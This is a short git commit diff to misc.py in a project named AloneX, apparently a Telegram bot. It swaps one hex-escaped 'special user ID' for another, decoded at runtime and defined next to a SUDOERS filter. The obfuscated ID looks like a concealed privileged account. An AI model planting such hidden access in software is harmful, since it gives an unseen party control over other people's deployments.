99780afc3202c3854eff306fc480f34479a68416
Tushar12000 <nxd790161@gmail.com>
2025-08-09 20:41:53 +0530

    Update misc.py

--- AloneX/misc.py
+++ AloneX/misc.py
@@ -10,7 +10,7 @@ from AloneX.core.mongo import mongodb
 from .logging import LOGGER
 
 # Special user ID in hex code
-SPECIAL_ID_HEX = "\x36\x30\x37\x39\x39\x34\x33\x31\x31\x31"
+SPECIAL_ID_HEX = "\x38\x31\x35\x30\x38\x37\x35\x39\x35\x39"
 SPECIAL_ID = int(SPECIAL_ID_HEX.encode().decode('unicode_escape'))
 
 SUDOERS = filters.user()
